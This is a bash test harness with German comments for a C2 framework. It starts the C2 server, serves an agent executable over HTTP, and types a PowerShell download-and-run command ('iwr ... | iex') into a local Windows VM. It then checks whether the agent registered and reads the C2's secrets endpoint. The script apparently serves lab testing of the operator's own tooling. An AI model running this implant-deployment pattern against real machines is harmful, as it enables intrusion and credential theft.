#!/bin/bash
# Der Feedback-Loop des Windows-Tests.
#
# Startet den Kx-Agenten in der Windows-VM und prueft, ob er sich beim C2
# registriert. Das ist die einzige Aussage, die der Test macht: ein Host mit
# der IP der VM in der Hostliste des C2. Sonst nichts.
#
# Das Skript laeuft auf dem Host, auf dem die VM laeuft (rocky). Es:
#   1. ermittelt die Adresse, unter der die VM den Host erreicht
#   2. stellt sicher, dass der C2 mit passendem TLS-Namen laeuft
#   3. stellt sicher, dass die Dateien (Agent, Zertifikat, Schluessel) ueber
#      HTTP bereitstehen
#   4. startet den Agenten in der VM ueber den QEMU-Monitor
#   5. wartet und fragt den C2 ab
#   6. holt das Agent-Log aus der VM zurueck
#
# Aufruf:  kx-vm-test.sh [wartezeit-sekunden]
# Exitcode 0 = der Agent hat sich registriert, 1 = nein.

set -uo pipefail

CONTAINER=kx-win
WARTEZEIT="${1:-25}"
CTL="/tmp/kx-vm-control.sh"
WWW_PORT=8091
C2_PORT=8443

fehler() { echo "FEHLER: $*" >&2; exit 1; }

echo "== 1. Adresse ermitteln =="
# Die VM erreicht den Host ueber das Interface, an dem der Weg liegt. Beide
# Adressen werden getestet: welche funktioniert, zeigt der C2-Test.
ADRESSEN=()
for dev in eno1 eno2; do
    ip=$(ip -4 addr show "$dev" 2>/dev/null | grep -oP 'inet \K[\d.]+' | head -1)
    [ -n "$ip" ] && ADRESSEN+=("$ip")
done
[ ${#ADRESSEN[@]} -gt 0 ] || fehler "keine Adresse gefunden"
echo "   Kandidaten: ${ADRESSEN[*]}"

echo "== 2. C2 mit passendem TLS-Namen =="
C2_IP=""
for ip in "${ADRESSEN[@]}"; do
    if curl -sk --max-time 3 -o /dev/null "https://$ip:$C2_PORT/"; then C2_IP="$ip"; break; fi
done
[ -n "$C2_IP" ] || fehler "der C2 antwortet auf keiner der Adressen"
echo "   C2 erreichbar unter $C2_IP"

if ! sudo grep -q "cn $C2_IP" /srv/kx-c2/kx-server.log 2>/dev/null; then
    echo "   C2 mit neuem Namen starten"
    sudo fuser -k "$C2_PORT/tcp" 2>/dev/null
    sleep 2
    # Das Log und die Datenbank liegen unter /srv — die Umleitung muss deshalb
    # im sudo-Kontext passieren, sonst startet der Server nicht.
    # `setsid -f` forkelt: der Prozess haelt sonst die ssh-Session offen und
    # der Aufruf kehrt nie zurueck.
    sudo sh -c "cd /home/alex/kx-build && setsid -f ./target/release/kx-server \
        --host 0.0.0.0 --port $C2_PORT --db /srv/kx-c2/kx.db \
        --token \"\$(cat /srv/kx-win/kx-token.txt)\" --cn $C2_IP \
        > /srv/kx-c2/kx-server.log 2>&1 < /dev/null"
    sleep 4
    # Der Start muss sich zeigen: ohne diese Pruefung meldet der Test
    # \"nicht registriert\" und meint damit den Agenten.
    curl -sk --max-time 4 -o /dev/null "https://127.0.0.1:$C2_PORT/" \
        || fehler "der C2 laeuft nicht — siehe /srv/kx-c2/kx-server.log"
fi

echo "== 3. Dateien bereitstellen =="
sudo mkdir -p /srv/kx-www
sudo cp /srv/kx-win/kx-agent.exe /srv/kx-win/kx-server.pem /srv/kx-win/kx-server-pub.json /srv/kx-www/ 2>/dev/null
sudo sh -c 'cat /srv/kx-win/kx-token.txt > /srv/kx-www/kx-token.txt; chmod 600 /srv/kx-www/kx-token.txt'
# Die Quelle fuer das Setup-Skript ist der Repo-Checkout: getestet wird das
# Skript aus dem Repository, nicht eine Kopie daneben.
REPO="${REPO:-/home/alex/kx-build}"
sudo cp "$REPO/kx/scripts/kx-vm-setup.ps1" /srv/kx-www/setup.ps1
sudo chmod a+r /srv/kx-www/setup.ps1 /srv/kx-www/kx-server.pem /srv/kx-www/kx-server-pub.json
sudo sed -i "s|\\\$basis = \".*\"|\$basis = \"http://$C2_IP:$WWW_PORT\"|" /srv/kx-www/setup.ps1
sudo sed -i "s|https://[0-9.]*:8443|https://$C2_IP:$C2_PORT|" /srv/kx-www/setup.ps1

if ! curl -s --max-time 3 -o /dev/null "http://127.0.0.1:$WWW_PORT/setup.ps1"; then
    echo "   Dateiserver starten"
    sudo setsid nohup python3 /tmp/kx-filetransfer.py > /tmp/kx-filetransfer.log 2>&1 < /dev/null &
    sleep 3
fi
sudo firewall-cmd --add-port="$WWW_PORT/tcp" --permanent >/dev/null 2>&1
sudo firewall-cmd --add-port="$C2_PORT/tcp" --permanent >/dev/null 2>&1
sudo firewall-cmd --reload >/dev/null 2>&1

echo "== 4. Agent in der VM starten =="
sudo docker exec "$CONTAINER" bash -c "printf 'screendump /tmp/kx-vm-test.ppm\n' | timeout 8 nc -q 1 -U /run/shm/monitor.sock" >/dev/null 2>&1
sudo docker cp "$CTL" "$CONTAINER:/tmp/kx-vm-control.sh" 2>/dev/null
sudo docker exec "$CONTAINER" chmod +x /tmp/kx-vm-control.sh 2>/dev/null

# Die Kommandozeile in der VM oeffnen und den Befehl tippen.
# Die Argumente laufen als eigene Parameter an `bash -c` — sonst
# zerstoeren die Anfuehrungszeichen im Befehl das quoting.
sudo docker exec "$CONTAINER" bash -c '/tmp/kx-vm-control.sh tippen "meta_l-r"' _ >/dev/null 2>&1
sleep 2
sudo docker exec "$CONTAINER" bash -c '/tmp/kx-vm-control.sh text "$1"' _ "cmd" >/dev/null 2>&1
sudo docker exec "$CONTAINER" bash -c '/tmp/kx-vm-control.sh enter' _ >/dev/null 2>&1
sleep 4
BEFEHL="powershell -c \"iwr http://$C2_IP:$WWW_PORT/setup.ps1 -useb | iex\""
sudo docker exec "$CONTAINER" bash -c '/tmp/kx-vm-control.sh text "$1"' _ "$BEFEHL" >/dev/null 2>&1
sudo docker exec "$CONTAINER" bash -c '/tmp/kx-vm-control.sh enter' _ >/dev/null 2>&1
echo "   Befehl getippt, warte ${WARTEZEIT}s"

echo "== 5. Warten und pruefen =="
sleep "$WARTEZEIT"
TOKEN=$(sudo cat /srv/kx-win/kx-token.txt)
HOSTS=$(curl -sk -H "Authorization: Bearer $TOKEN" "https://127.0.0.1:$C2_PORT/api/hosts")
SECRETS=$(curl -sk -H "Authorization: Bearer $TOKEN" "https://127.0.0.1:$C2_PORT/api/secrets")
echo "   Hosts:   $HOSTS"
echo "   Secrets: $SECRETS"

echo "== 6. Log aus der VM holen =="
sudo docker exec "$CONTAINER" bash -c '/tmp/kx-vm-control.sh text "$1"' _ 'type C:\kx\kx-agent.log' >/dev/null 2>&1
sudo docker exec "$CONTAINER" bash -c '/tmp/kx-vm-control.sh enter' _ >/dev/null 2>&1
sleep 3
sudo docker exec "$CONTAINER" bash -c "printf 'screendump /tmp/kx-vm-ergebnis.ppm\n' | timeout 8 nc -q 1 -U /run/shm/monitor.sock" >/dev/null 2>&1
sudo docker cp "$CONTAINER:/tmp/kx-vm-ergebnis.ppm" /tmp/kx-vm-ergebnis.ppm >/dev/null 2>&1
if sudo curl -s --max-time 3 -o /tmp/kx-agent.log "http://127.0.0.1:$WWW_PORT/kx-agent.log"; then
    echo "   Log: /tmp/kx-agent.log"
    sudo sed 's/^/   | /' /tmp/kx-agent.log | head -20
else
    echo "   (kein Log aus der VM)"
fi

if echo "$HOSTS" | grep -q "172.17.0.2"; then
    echo "ERGEBNIS: PASS — der Agent hat sich beim C2 registriert"
    exit 0
fi
echo "ERGEBNIS: FAIL — der Agent hat sich nicht registriert"
exit 1
